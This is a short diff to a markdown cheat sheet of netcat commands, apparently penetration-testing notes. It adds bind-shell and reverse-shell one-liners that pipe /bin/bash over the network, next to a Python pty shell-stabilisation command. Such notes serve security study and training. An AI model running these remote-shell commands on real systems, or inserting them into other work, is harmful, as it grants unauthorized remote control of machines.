@@ -48,6 +48,8 @@
     * `-n`: Don't resolve host names or use DNS
     * `-p`: Port specification
   * `nc <ip> <port>`
+  * `nc -lnvp <port> -e /bin/bash`: A bind shell listener
+  * `nc <ip> <port> -e /bin/bash`: Connect to reverse shell
 * Netcat Shell Stabilisation
   * Python
     * `python -c 'import pty;pty.spawn("/bin/bash")'`: Spawn a better featured bash shell
